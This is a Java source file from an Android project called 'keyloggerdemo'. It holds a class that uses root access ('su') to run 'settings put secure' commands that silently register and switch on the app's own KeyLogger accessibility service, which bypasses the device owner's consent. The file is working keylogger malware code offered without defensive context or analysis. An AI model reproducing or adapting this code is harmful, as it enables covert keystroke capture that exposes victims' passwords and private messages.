package com.dlive.keyloggerdemo.EnableAccessibility;

import android.util.Log;

import java.io.DataOutputStream;

/**
 * Created by dtz on 2016/12/3.
 */
public class EnableAccessibilityService {

    private String packageName = "com.dlive.keyloggerdemo";

    public void run(){
        Log.d("keylogger","enable accessibility service");
        String cmd1="settings put secure enabled_accessibility_services " + this.packageName + "/" + this.packageName + ".KeyLogger.KeyLogger";
        String cmd2="settings put secure accessibility_enabled 1";
        RootCommand(cmd1);
        RootCommand(cmd2);
    }

    private boolean RootCommand(String command)
    {
        Process process = null;
        DataOutputStream os = null;
        try
        {
            process = Runtime.getRuntime().exec("su");
            os = new DataOutputStream(process.getOutputStream());
            os.writeBytes(command + "\n");
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (Exception e)
        {
            Log.d("keylogger", "ROOT REE" + e.getMessage());
            return false;
        } finally
        {
            try
            {
                if (os != null)
                {
                    os.close();
                }
                process.destroy();
            } catch (Exception e)
            {
            }
        }
        Log.d("keylogger", "Root SUC ");
        return true;
    }
}
